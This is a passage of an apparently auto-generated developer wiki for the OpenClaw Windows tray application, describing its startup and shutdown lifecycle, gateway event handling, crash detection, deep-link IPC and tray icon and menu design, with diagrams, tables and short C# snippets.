A hidden window anchors the WinUI runtime and prevents garbage collection issues:

[src/OpenClaw.Tray.WinUI/App.xaml.cs:302-312]()

This window is created at startup with minimal size (1×1 pixels), moved off-screen, and kept alive for the application lifetime. It ensures the WinUI DispatcherQueue and XAML island infrastructure remain properly initialized.

### Pre-Created Tray Menu

The tray menu window is created once at startup and reused for all subsequent menu displays:

[src/OpenClaw.Tray.WinUI/App.xaml.cs:329-335]()

Instead of closing the window after each use, it is hidden and its content rebuilt on the next tray icon click. This prevents fail-fast crashes related to creating new WinUI windows after the application has been idle.

### On-Demand Secondary Windows

Other windows (Settings, WebChat, StatusDetail, NotificationHistory) are created on first access and cached:

```csharp
private void ShowSettings()
{
    if (_settingsWindow == null || _settingsWindow.IsClosed)
    {
        _settingsWindow = new SettingsWindow(_settings, _gatewayClient, _nodeService);
        _settingsWindow.SettingsSaved += OnSettingsSaved;
    }
    _settingsWindow.Activate();
}
```

This pattern ensures:
- No duplicate windows (singleton enforcement)
- Window reuse when already open
- Proper event handler registration
- Recreation only when explicitly closed

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:64-70](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:302-335]()

## Event-Driven Architecture

```mermaid
sequenceDiagram
    participant Gateway as Gateway<br/>(WebSocket)
    participant GWClient as OpenClawGatewayClient
    participant DispatcherQ as DispatcherQueue<br/>(UI Thread)
    participant App as App Class
    participant UI as UI Components<br/>(Tray, Windows)
    
    Gateway->>GWClient: WebSocket message<br/>(agent, chat, health)
    GWClient->>GWClient: Parse JSON<br/>Identify event type
    GWClient->>DispatcherQ: Post(UpdateUI)
    Note over DispatcherQ: Marshal to UI thread
    DispatcherQ->>App: Event handler<br/>(on UI thread)
    App->>App: Update _currentStatus<br/>_lastSessions<br/>_currentActivity
    App->>UI: Update tray icon<br/>Rebuild menu<br/>Show toast
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:46-57](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:209-300]()

### Thread Marshaling

All gateway events must be marshaled from the WebSocket receive thread to the UI thread. The WinUI application uses `Microsoft.UI.Dispatching.DispatcherQueue`:

[src/OpenClaw.Tray.WinUI/App.xaml.cs:209-213]()

Gateway client event handlers post work to the dispatcher:

```csharp
// Example: Status changed event (fired on WebSocket thread)
_gatewayClient.StatusChanged += (sender, status) =>
{
    _dispatcherQueue?.TryEnqueue(() =>
    {
        UpdateStatus(status);
    });
};
```

The WinForms implementation uses `SynchronizationContext.Post` instead:

[src/OpenClaw.Tray/TrayApplication.cs:468-470]()

### Gateway Event Handlers

The application subscribes to gateway client events during initialization:

[src/OpenClaw.Tray.WinUI/App.xaml.cs:263-274]() (Operator Mode)

| Event | Handler | Purpose |
|-------|---------|---------|
| `StatusChanged` | `OnStatusChanged` | Update tray icon color/tooltip, rebuild menu status row |
| `ActivityChanged` | `OnActivityChanged` | Update activity badge, session tracking, activity stream |
| `ChannelHealthUpdated` | `OnChannelHealthUpdated` | Rebuild channel health rows in menu |
| `SessionsUpdated` | `OnSessionsUpdated` | Rebuild session list in menu, cache for detail view |
| `UsageUpdated` | `OnUsageUpdated` | Update usage display (tokens, cost, model) |
| `NotificationReceived` | `OnNotificationReceived` | Show toast notification, add to history |

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:263-274](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:46-57]()

## Crash Handling and Recovery

The application implements multiple layers of crash protection:

### Unhandled Exception Handlers

[src/OpenClaw.Tray.WinUI/App.xaml.cs:86-125]()

Three exception handlers are registered:
1. `UnhandledException` - WinUI XAML exceptions (set `Handled = true` to prevent crash)
2. `UnhandledExceptionEventArgs` - AppDomain-level exceptions (logged but not handled)
3. `UnobservedTaskException` - Background task exceptions (set `Observed` to prevent crash)

All exceptions are logged to both the rotating log file and a dedicated crash log.

### Crash Detection

A run marker file tracks clean application startup and shutdown:

[src/OpenClaw.Tray.WinUI/App.xaml.cs:154-188]()

On startup, if the marker file exists, the previous run did not exit cleanly. This is logged for diagnostic purposes.

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:86-188]()

## Initialization Sequence

```mermaid
sequenceDiagram
    participant User
    participant OS as Windows OS
    participant App as App.OnLaunched
    participant Settings as SettingsManager
    participant Gateway as OpenClawGatewayClient
    participant TrayIcon as TrayIcon
    participant Updater as UpdatumManager
    
    User->>OS: Launch OpenClaw.Tray.WinUI.exe
    OS->>App: OnLaunched(args)
    
    App->>App: Check protocol activation<br/>(MSIX deep link)
    App->>App: Single instance check<br/>(Mutex)
    
    alt Second instance
        App->>App: Forward deep link to pipe
        App->>OS: Exit()
    end
    
    App->>App: RegisterUriScheme()<br/>(openclaw://)
    App->>Updater: CheckForUpdatesAsync()
    
    alt Update available
        Updater->>User: Show update dialog
        Updater->>OS: Download & install<br/>Exit app
    end
    
    App->>Settings: new SettingsManager()
    
    alt First run (no token)
        App->>User: ShowFirstRunWelcomeAsync()
    end
    
    App->>TrayIcon: InitializeTrayIcon()
    App->>App: InitializeTrayMenuWindow()<br/>(pre-create)
    
    alt EnableNodeMode = true
        App->>Gateway: InitializeNodeService()
    else Operator mode
        App->>Gateway: InitializeGatewayClient()
    end
    
    Gateway->>Gateway: ConnectAsync()
    App->>App: StartHealthCheckTimer()<br/>(30s)
    App->>App: StartDeepLinkServer()<br/>(Named pipe)
    
    alt GlobalHotkeyEnabled
        App->>App: RegisterHotkey()<br/>(Ctrl+Alt+Shift+C)
    end
    
    alt Startup deep link
        App->>App: HandleDeepLink(uri)
    end
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:209-300]()

## Configuration and Persistence

Application settings are managed by `SettingsManager` and persisted to `%APPDATA%\OpenClawTray\settings.json`. For details on settings structure, UI, and registry integration, see [Configuration & Settings](#5).

Logs are written to `%LOCALAPPDATA%\OpenClawTray\openclaw-tray.log` with automatic rotation at 1MB. Crash logs are written to a separate `crash.log` file in the same directory.

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:80-84](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:127-152]()

---

# Page: Application Lifecycle

# Application Lifecycle

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/OpenClawGatewayClient.cs](src/OpenClaw.Shared/OpenClawGatewayClient.cs)
- [src/OpenClaw.Tray.WinUI/App.xaml.cs](src/OpenClaw.Tray.WinUI/App.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml](src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml)
- [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs)
- [src/OpenClaw.Tray/Program.cs](src/OpenClaw.Tray/Program.cs)
- [src/OpenClaw.Tray/SettingsDialog.cs](src/OpenClaw.Tray/SettingsDialog.cs)

</details>



This document details the application startup sequence, single-instance enforcement, update checking, initialization phases, runtime state management, and shutdown procedures for the OpenClaw Windows Hub tray application.

For information about the settings persistence and configuration management, see [Configuration & Settings](#5). For details about gateway connection establishment and reconnection logic, see [Gateway Client](#3.1). For update installation and version management, see [Versioning & Updates](#6.4).

---

## Overview

The OpenClaw Windows Hub tray application follows a multi-phase initialization sequence designed to ensure single-instance operation, automatic updates, proper configuration, and reliable gateway connectivity. The application supports two startup paths:

- **WinUI 3 Application** ([src/OpenClaw.Tray.WinUI/App.xaml.cs]()) - Modern MSIX/standalone builds
- **WinForms Application** ([src/OpenClaw.Tray/Program.cs]()) - Legacy single-file executable

Both implementations share a common lifecycle pattern with minor platform-specific variations.

---

## Startup Sequence

The application startup follows a strict sequence to ensure proper initialization and error handling.

### Phase 1: Pre-Launch Validation

```mermaid
sequenceDiagram
    participant User
    participant Mutex as "Mutex<br/>(OpenClawTray)"
    participant PipeClient as "NamedPipeClientStream<br/>(OpenClawTray-DeepLink)"
    participant RunningInstance as "Running Instance"
    participant Updatum as "UpdatumManager"
    participant App as "Application"

    User->>Mutex: Launch application
    Mutex->>Mutex: Mutex.WaitOne(0)
    
    alt Instance already running
        Mutex-->>App: createdNew = false
        App->>App: Check for openclaw:// args
        alt Has deep link argument
            App->>PipeClient: Connect()
            PipeClient->>RunningInstance: Send deep link URI
            RunningInstance-->>PipeClient: ACK
        else No deep link
            App->>User: Show "Already running" message
        end
        App->>App: Exit()
    else First instance
        Mutex-->>App: createdNew = true
        App->>App: RegisterUriScheme()
        App->>Updatum: CheckForUpdatesAsync()
        
        alt Update available
            Updatum-->>App: updateFound = true
            App->>User: Show UpdateDialog
            alt User chooses Download
                App->>Updatum: DownloadUpdateAsync()
                App->>Updatum: InstallUpdateAsync()
                App->>App: Exit() & Restart
            else User chooses RemindLater/Skip
                App->>App: Continue startup
            end
        else No update
            Updatum-->>App: updateFound = false
            App->>App: Continue startup
        end
    end
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:209-244](), [src/OpenClaw.Tray/Program.cs:23-56]()

### Phase 2: Application Initialization

```mermaid
graph TD
    Start["Application Launch"] --> CrashCheck["CheckPreviousRun()"]
    CrashCheck --> MarkRun["MarkRunStarted()"]
    MarkRun --> ExceptionHandlers["Register Exception Handlers"]
    
    ExceptionHandlers --> UnhandledException["UnhandledException"]
    ExceptionHandlers --> DomainUnhandled["DomainUnhandledException"]
    ExceptionHandlers --> UnobservedTask["UnobservedTaskException"]
    ExceptionHandlers --> ProcessExit["ProcessExit"]
    
    UnhandledException --> LogCrash["LogCrash()"]
    DomainUnhandled --> LogCrash
    UnobservedTask --> LogCrash
    ProcessExit --> MarkRunEnded["MarkRunEnded()"]
    
    ExceptionHandlers --> OnLaunched["OnLaunched()"]
    OnLaunched --> GetProtocolUri["GetProtocolActivationUri()"]
    OnLaunched --> SingleInstance["Single Instance Check<br/>(Mutex)"]
    
    SingleInstance --> RegisterToast["Register Toast Activation"]
    RegisterToast --> InitSettings["Initialize SettingsManager"]
    InitSettings --> FirstRun{"Token empty?"}
    
    FirstRun -->|Yes| WelcomeDialog["ShowFirstRunWelcomeAsync()"]
    FirstRun -->|No| InitTray["InitializeTrayIcon()"]
    WelcomeDialog --> InitTray
    
    InitTray --> InitKeepAlive["InitializeKeepAliveWindow()"]
    InitKeepAlive --> InitMenuWindow["InitializeTrayMenuWindow()"]
    InitMenuWindow --> ModeCheck{"EnableNodeMode?"}
    
    ModeCheck -->|Yes| NodeMode["InitializeNodeService()"]
    ModeCheck -->|No| OperatorMode["InitializeGatewayClient()"]
    
    NodeMode --> StartTimers["StartHealthCheckTimer()"]
    OperatorMode --> StartTimers
    
    StartTimers --> StartDeepLink["StartDeepLinkServer()"]
    StartDeepLink --> Hotkey{"GlobalHotkeyEnabled?"}
    
    Hotkey -->|Yes| RegisterHotkey["GlobalHotkeyService.Register()"]
    Hotkey -->|No| ProcessDeepLink["Process pending deep link"]
    RegisterHotkey --> ProcessDeepLink
    
    ProcessDeepLink --> Running["Application Running"]
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:86-300](), [src/OpenClaw.Tray/Program.cs:23-56]()

---

## Single-Instance Enforcement

The application uses a named `Mutex` to enforce single-instance operation. When a second instance is launched, it forwards any deep link arguments to the running instance via named pipe IPC.

| Component | Implementation | Purpose |
|-----------|----------------|---------|
| `Mutex` | `"OpenClawTray"` | Global instance lock |
| `NamedPipeServerStream` | `"OpenClawTray-DeepLink"` | IPC server in running instance |
| `NamedPipeClientStream` | `"OpenClawTray-DeepLink"` | IPC client in new instances |
| `DeepLinkHandler` | URI scheme registration | Register `openclaw://` protocol |

### Deep Link Forwarding Flow

```mermaid
sequenceDiagram
    participant NewInstance as "New Instance"
    participant Pipe as "NamedPipe<br/>(OpenClawTray-DeepLink)"
    participant Server as "DeepLinkServer<br/>(Running Instance)"
    participant Handler as "HandleDeepLink()"

    NewInstance->>Pipe: Connect(1000ms timeout)
    Pipe->>Server: WaitForConnectionAsync()
    Server-->>Pipe: Connection established
    
    NewInstance->>Pipe: WriteLine(openclaw://...)
    Pipe->>Server: ReadLineAsync()
    Server->>Handler: onDeepLinkReceived(uri)
    
    Handler->>Handler: Parse URI path
    alt openclaw://chat
        Handler->>Handler: ShowWebChat()
    else openclaw://send?text=...
        Handler->>Handler: ShowQuickSend(text)
    else openclaw://dashboard/...
        Handler->>Handler: OpenDashboard(path)
    end
    
    NewInstance->>NewInstance: Exit()
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:26,216-230,280](), [src/OpenClaw.Tray/Program.cs:14,26-40,159-176,178-203]()

---

## Update Checking

The application uses the `Updatum` library to check for updates from the GitHub releases before completing startup. This ensures users are always running the latest version.

### Update Check Phases

| Phase | Action | User Decision |
|-------|--------|---------------|
| **Check** | `UpdatumManager.CheckForUpdatesAsync()` | N/A |
| **Prompt** | Show `UpdateDialog` with changelog | Download / RemindLater / Skip |
| **Download** | `DownloadUpdateAsync()` with progress dialog | N/A |
| **Install** | `InstallUpdateAsync()` → App restarts | Yes / No |

```mermaid
graph TB
    CheckUpdate["AppUpdater.CheckForUpdatesAsync()"] --> UpdateFound{"Update available?"}
    
    UpdateFound -->|No| ContinueLaunch["Continue to app launch"]
    UpdateFound -->|Yes| ShowDialog["UpdateDialog<br/>(tagName, changelog)"]
    
    ShowDialog --> UserChoice{"User choice?"}
    
    UserChoice -->|Download| DownloadProgress["DownloadProgressDialog"]
    UserChoice -->|RemindLater| ContinueLaunch
    UserChoice -->|Skip| ContinueLaunch
    
    DownloadProgress --> DownloadAsset["DownloadUpdateAsync()"]
    DownloadAsset --> FileExists{"File exists?"}
    
    FileExists -->|No| ErrorAV["Error: Antivirus may have<br/>quarantined update file"]
    FileExists -->|Yes| ConfirmInstall["Confirm restart?"]
    
    ConfirmInstall -->|Yes| Install["InstallUpdateAsync()"]
    ConfirmInstall -->|No| ContinueLaunch
    
    Install --> Restart["App restarts with new version"]
    ErrorAV --> ContinueLaunch
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:28-32,239-245](), [src/OpenClaw.Tray/Program.cs:16-20,49-156]()

---

## Settings and First-Run Initialization

The application initializes the `SettingsManager` to load persisted configuration. If the authentication token is empty, a first-run welcome dialog guides the user through initial setup.

### Settings Initialization

```mermaid
graph LR
    InitSettings["SettingsManager()"] --> LoadJson["Load settings.json<br/>from %APPDATA%"]
    LoadJson --> TokenCheck{"Token empty?"}
    
    TokenCheck -->|Yes| WelcomeDialog["WelcomeDialog"]
    TokenCheck -->|No| ApplySettings["Apply settings to UI"]
    
    WelcomeDialog --> EnterToken["User enters:<br/>- Gateway URL<br/>- Token"]
    EnterToken --> TestConnection["Test connection"]
    TestConnection --> Success{"Connected?"}
    
    Success -->|Yes| SaveSettings["Save settings"]
    Success -->|No| RetryPrompt["Show error, retry"]
    RetryPrompt --> EnterToken
    
    SaveSettings --> ApplySettings
    ApplySettings --> Ready["App ready"]
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:250-257]()

---

## Connection Initialization

Based on the `EnableNodeMode` setting, the application initializes either the **Gateway Client** (operator mode) or the **Node Service** (node mode). Only one connection type is active at a time to avoid gateway conflicts.

### Connection Mode Selection

| Mode | Client | Purpose | Features |
|------|--------|---------|----------|
| **Operator Mode** | `OpenClawGatewayClient` | Monitor and interact with assistant | Sessions, channels, usage, notifications |
| **Node Mode** | `NodeService` + `WindowsNodeClient` | Remote-controlled agent | System commands, canvas, screen capture, camera |

```mermaid
graph TB
    CheckMode{"EnableNodeMode?"}
    
    CheckMode -->|false| OperatorMode["Operator Mode"]
    CheckMode -->|true| NodeMode["Node Mode"]
    
    OperatorMode --> InitGateway["InitializeGatewayClient()"]
    InitGateway --> CreateClient["new OpenClawGatewayClient<br/>(gatewayUrl, token)"]
    CreateClient --> RegisterEvents["Register event handlers:<br/>- StatusChanged<br/>- NotificationReceived<br/>- ActivityChanged<br/>- ChannelHealthUpdated<br/>- SessionsUpdated<br/>- UsageUpdated"]
    RegisterEvents --> ConnectGateway["client.ConnectAsync()"]
    
    NodeMode --> InitNode["InitializeNodeService()"]
    InitNode --> CreateNode["new NodeService<br/>(settings, logger)"]
    CreateNode --> AddCapabilities["Add capabilities:<br/>- SystemCapability<br/>- CanvasCapability<br/>- ScreenCapability<br/>- CameraCapability"]
    AddCapabilities --> ConnectNode["service.ConnectAsync()"]
    
    ConnectGateway --> StartTimer["StartHealthCheckTimer()"]
    ConnectNode --> StartTimer
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:263-274](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:59-108]()

---

## Tray Icon and UI Initialization

The tray icon is initialized with a keep-alive window to anchor the WinUI runtime and prevent GC/threading issues. The tray menu window is pre-created to avoid crashes when creating windows after the application has been idle.

### Tray Initialization Sequence

```mermaid
graph TD
    InitTray["InitializeTrayIcon()"] --> KeepAlive["InitializeKeepAliveWindow()"]
    KeepAlive --> CreateKeepAlive["new Window()<br/>Hidden, off-screen<br/>1x1 pixels"]
    CreateKeepAlive --> PreCreateMenu["InitializeTrayMenuWindow()"]
    
    PreCreateMenu --> CreateMenu["new TrayMenuWindow()<br/>Pre-create to avoid crashes"]
    CreateMenu --> CreateIcon["new TrayIcon<br/>(iconPath, tooltip)"]
    CreateIcon --> RegisterHandlers["Register handlers:<br/>- Selected (left-click)<br/>- ContextMenu (right-click)"]
    
    RegisterHandlers --> SetVisible["trayIcon.IsVisible = true"]
    SetVisible --> Ready["Tray icon visible"]
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:302-335]()

---

## Runtime State Management

During runtime, the application maintains several state variables to track connection status, agent activity, sessions, channels, and usage information.

### State Variables

| Variable | Type | Purpose |
|----------|------|---------|
| `_currentStatus` | `ConnectionStatus` | Current gateway connection state |
| `_currentActivity` | `AgentActivity?` | Current agent job/tool activity |
| `_lastSessions` | `SessionInfo[]` | Cached session list from gateway |
| `_lastChannels` | `ChannelHealth[]` | Cached channel health status |
| `_lastUsage` | `GatewayUsageInfo?` | Cached usage statistics |
| `_sessionActivities` | `Dictionary<string, AgentActivity>` | Per-session activity tracking |
| `_sessionPreviews` | `Dictionary<string, SessionPreviewInfo>` | Session preview cache |

### Connection State Machine

```mermaid
stateDiagram-v2
    [*] --> Disconnected
    
    Disconnected --> Connecting: ConnectAsync()
    Connecting --> Connected: hello-ok event
    Connecting --> Error: Connection failed
    
    Connected --> Disconnected: DisconnectAsync()
    Connected --> Error: Connection lost
    
    Error --> Connecting: ReconnectWithBackoffAsync()
    Error --> Disconnected: User stops app
    
    Connected --> Connected: Health check success
    Error --> Error: Reconnect failed<br/>(exponential backoff)
    
    note right of Connecting
        WebSocket state: Connecting
        Status event fired
    end note
    
    note right of Connected
        WebSocket state: Open
        Request initial state:
        - CheckHealthAsync()
        - RequestSessionsAsync()
        - RequestUsageAsync()
        - RequestNodesAsync()
    end note
    
    note right of Error
        Backoff delays:
        1s, 2s, 4s, 8s, 15s, 30s, 60s
    end note
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:44-62](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:69-153,318-339]()

---

## Health Check Timer

A periodic timer checks gateway connectivity and refreshes session/usage data to keep the tray menu up-to-date.

```mermaid
sequenceDiagram
    participant Timer as "Timer<br/>(every 30s)"
    participant Client as "OpenClawGatewayClient"
    participant Gateway as "Gateway"
    participant UI as "Tray Icon"

    Timer->>Client: CheckHealthAsync()
    Client->>Gateway: req: health (deep=true)
    Gateway-->>Client: res: { channels: [...] }
    Client->>UI: ChannelHealthUpdated event
    
    Note over Timer: After health check
    
    Timer->>Client: RequestSessionsAsync()
    Client->>Gateway: req: sessions.list
    Gateway-->>Client: res: { sessions: [...] }
    Client->>UI: SessionsUpdated event
    
    Timer->>Client: RequestUsageAsync()
    Client->>Gateway: req: usage.status
    Gateway-->>Client: res: { providers: [...] }
    Client->>UI: UsageUpdated event
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:38,277]()

---

## Crash Detection and Recovery

The application implements crash detection by writing a marker file on startup and deleting it on clean shutdown. If the marker exists on next startup, it indicates a previous crash.

### Crash Detection Mechanism

```mermaid
graph TB
    Startup["Application Startup"] --> CheckMarker["CheckPreviousRun()"]
    CheckMarker --> MarkerExists{"run.marker exists?"}
    
    MarkerExists -->|Yes| ReadTimestamp["Read startup timestamp"]
    MarkerExists -->|No| CreateMarker["MarkRunStarted()"]
    
    ReadTimestamp --> LogCrash["Logger.Error<br/>(Previous session crashed)"]
    LogCrash --> DeleteMarker["Delete run.marker"]
    DeleteMarker --> CreateMarker
    
    CreateMarker --> WriteMarker["Write current timestamp<br/>to run.marker"]
    WriteMarker --> RegisterHandlers["Register exception handlers"]
    
    RegisterHandlers --> UnhandledException
    RegisterHandlers --> DomainUnhandled
    RegisterHandlers --> UnobservedTask
    
    UnhandledException --> CrashLog["LogCrash()<br/>Write to crash.log"]
    DomainUnhandled --> CrashLog
    UnobservedTask --> CrashLog
    
    CrashLog --> HandleError["Try to prevent crash<br/>e.Handled = true"]
    
    RegisterHandlers --> ProcessExit
    ProcessExit --> MarkEnded["MarkRunEnded()"]
    MarkEnded --> DeleteMarkerClean["Delete run.marker"]
```

**File Locations:**
- Marker file: `%LOCALAPPDATA%\OpenClawTray\run.marker`
- Crash log: `%LOCALAPPDATA%\OpenClawTray\crash.log`

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:80-188]()

### Exception Handler Registration

| Handler | Event | Action |
|---------|-------|--------|
| `OnUnhandledException` | `Application.UnhandledException` | Log crash, set `e.Handled = true` |
| `OnDomainUnhandledException` | `AppDomain.UnhandledException` | Log crash |
| `OnUnobservedTaskException` | `TaskScheduler.UnobservedTaskException` | Log crash, set `e.SetObserved()` |
| `OnProcessExit` | `AppDomain.ProcessExit` | Mark clean shutdown, log exit code |

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:94-125]()

---

## Shutdown Sequence

Application shutdown can be triggered by the user (Exit menu), system shutdown, or application crash. The shutdown sequence ensures proper cleanup.

```mermaid
graph TD
    Trigger["Exit Trigger<br/>(User/System/Crash)"] --> DisconnectGW{"Gateway client?"}
    
    DisconnectGW -->|Yes| StopGateway["gatewayClient.DisconnectAsync()"]
    DisconnectGW -->|No| CheckNode{"Node service?"}
    
    StopGateway --> CheckNode
    CheckNode -->|Yes| StopNode["nodeService.DisconnectAsync()"]
    CheckNode -->|No| StopTimers
    
    StopNode --> StopTimers["Stop health check timer<br/>Stop session poll timer"]
    StopTimers --> UnregisterHotkey{"Hotkey registered?"}
    
    UnregisterHotkey -->|Yes| Unregister["globalHotkey.Unregister()"]
    UnregisterHotkey -->|No| DisposeMutex
    
    Unregister --> DisposeMutex["Dispose mutex"]
    DisposeMutex --> CloseWindows["Close all windows:<br/>- Settings<br/>- WebChat<br/>- QuickSend<br/>- StatusDetail<br/>- NotificationHistory"]
    
    CloseWindows --> HideTray["Hide tray icon"]
    HideTray --> MarkEnded["MarkRunEnded()"]
    MarkEnded --> LogExit["Logger.Info<br/>(Exit code)"]
    LogExit --> Exit["Application.Exit()"]
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:117-125,180-188]()

---

## Code Entity Reference

### Key Classes

| Class | File | Purpose |
|-------|------|---------|
| `App` | [src/OpenClaw.Tray.WinUI/App.xaml.cs]() | WinUI application lifecycle manager |
| `TrayApplication` | [src/OpenClaw.Tray/TrayApplication.cs]() | WinForms application lifecycle manager |
| `OpenClawGatewayClient` | [src/OpenClaw.Shared/OpenClawGatewayClient.cs]() | WebSocket gateway client |
| `SettingsManager` | [src/OpenClaw.Shared/SettingsManager.cs]() | Configuration persistence |
| `UpdatumManager` | Updatum library | GitHub release auto-updater |
| `DeepLinkHandler` | [src/OpenClaw.Shared/DeepLinkHandler.cs]() | URI scheme registration |
| `GlobalHotkeyService` | [src/OpenClaw.Shared/Services/GlobalHotkeyService.cs]() | System-wide hotkey handler |

### Lifecycle Methods

| Method | Phase | Purpose |
|--------|-------|---------|
| `OnLaunched()` | Startup | WinUI entry point, initialization orchestration |
| `Main()` | Startup | WinForms entry point, update check, mutex check |
| `CheckPreviousRun()` | Pre-init | Detect previous crash via marker file |
| `MarkRunStarted()` | Pre-init | Write marker file with timestamp |
| `ShowFirstRunWelcomeAsync()` | Init | Show welcome dialog if no token |
| `InitializeTrayIcon()` | Init | Create tray icon and keep-alive window |
| `InitializeGatewayClient()` | Init | Create and connect operator client |
| `InitializeNodeService()` | Init | Create and connect node client |
| `StartHealthCheckTimer()` | Init | Start periodic health checks |
| `StartDeepLinkServer()` | Init | Start IPC server for deep links |
| `OnProcessExit()` | Shutdown | Clean shutdown marker deletion |
| `MarkRunEnded()` | Shutdown | Delete marker file |

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:86-300,154-188](), [src/OpenClaw.Tray/Program.cs:23-56]()

---

# Page: System Tray Icon & Menu

# System Tray Icon & Menu

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/OpenClawGatewayClient.cs](src/OpenClaw.Shared/OpenClawGatewayClient.cs)
- [src/OpenClaw.Tray.WinUI/App.xaml.cs](src/OpenClaw.Tray.WinUI/App.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs)
- [src/OpenClaw.Tray/TrayApplication.cs](src/OpenClaw.Tray/TrayApplication.cs)
- [tests/OpenClaw.Shared.Tests/ModelsTests.cs](tests/OpenClaw.Shared.Tests/ModelsTests.cs)

</details>



The system tray icon and menu provide the primary user interface for the OpenClaw Windows Hub. The tray icon displays connection status and agent activity, while the context menu provides access to gateway information, quick actions, and configuration. For application lifecycle and initialization, see [Application Lifecycle](#2.1). For deep link handling and URI schemes, see [Deep Links & URI Schemes](#5.2).

## Icon States & Visual Indicators

The tray icon uses different visual representations to communicate connection status and agent activity at a glance.

### Connection Status Icons

The icon appearance changes based on `ConnectionStatus`:

| Status | Visual Representation | Color |
|--------|----------------------|-------|
| `Connected` | Pixel lobster graphic | Red/Orange (#ff4f40) |
| `Connecting` | Solid circle | Amber (#ffb400) |
| `Error` | Solid circle | Red (#dc3232) |
| `Disconnected` | Solid circle | Gray (#808080) |

When connected, the icon displays a 16×16 pixel art lobster rendered using specific color codes from the OpenClaw brand palette [src/OpenClaw.Tray/TrayApplication.cs:762-817]().

### Activity Badges

When the agent is actively working (not `ActivityKind.Idle`), a small colored badge appears in the top-right corner of the icon to indicate the type of activity:

| Activity Type | Badge Color |
|---------------|-------------|
| `Exec` | Orange (#ff6400) |
| `Write`, `Edit` | Green (#64c832) |
| `Read` | Blue (#5096ff) |
| `Search`, `Browser` | Purple (#b450ff) |
| `Message` | Bright green (#32c864) |

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:708-760](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:315-327]()

### Icon State Transitions

```mermaid
stateDiagram-v2
    [*] --> Disconnected: Application starts
    Disconnected --> Connecting: ConnectAsync()
    Connecting --> Connected: hello-ok received
    Connecting --> Error: Connection failed
    Connected --> Disconnected: DisconnectAsync()
    Connected --> Error: WebSocket error
    Error --> Connecting: ReconnectWithBackoffAsync()
    
    state Connected {
        [*] --> Idle
        Idle --> Working: ActivityChanged event
        Working --> Idle: Activity.Kind = Idle
    }
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:69-108](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:318-339]()

## Menu Architecture

The tray menu is constructed dynamically based on gateway state and displays real-time information about sessions, channels, usage, and activity.

### Menu Building Flow

```mermaid
graph TB
    TrayClick["User clicks tray icon"]
    PreFetch["Pre-fetch fresh data<br/>CheckHealthAsync()<br/>RequestSessionsAsync()<br/>RequestUsageAsync()"]
    WaitDelay["Delay 50-200ms<br/>for responses"]
    BuildMenu["BuildTrayMenuPopup()<br/>or BuildModernMenu()"]
    PopulateData["Populate from cached state:<br/>_lastSessions<br/>_lastChannels<br/>_lastUsage<br/>_currentActivity"]
    ShowMenu["Show TrayMenuWindow<br/>or ModernTrayMenu"]
    
    TrayClick --> PreFetch
    PreFetch --> WaitDelay
    WaitDelay --> BuildMenu
    BuildMenu --> PopulateData
    PopulateData --> ShowMenu
    
    style PreFetch fill:#e1f5ff
    style PopulateData fill:#e1ffe1
```

The menu construction follows a two-phase approach: pre-fetch fresh data asynchronously while showing cached data immediately for responsiveness [src/OpenClaw.Tray.WinUI/App.xaml.cs:456-515]().

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:336-347](), [src/OpenClaw.Tray/TrayApplication.cs:166-189]()

### Menu Layout Structure

The menu is organized into logical sections with dynamic content:

```mermaid
graph TB
    BrandHeader["🦞 Brand Header<br/>'Molty'"]
    Status["Status Section<br/>ConnectionStatus + icon"]
    Activity["Activity Section<br/>Current AgentActivity<br/>(if not Idle)"]
    Usage["Usage Section<br/>GatewayUsageInfo<br/>GatewayUsageCostInfo"]
    NodeMode["Node Mode Section<br/>Pairing status<br/>Device ID<br/>(if enabled)"]
    Sessions["Sessions Section<br/>SessionInfo[] list<br/>Top 3 visible"]
    Channels["Channels Section<br/>ChannelHealth[] list<br/>Toggleable"]
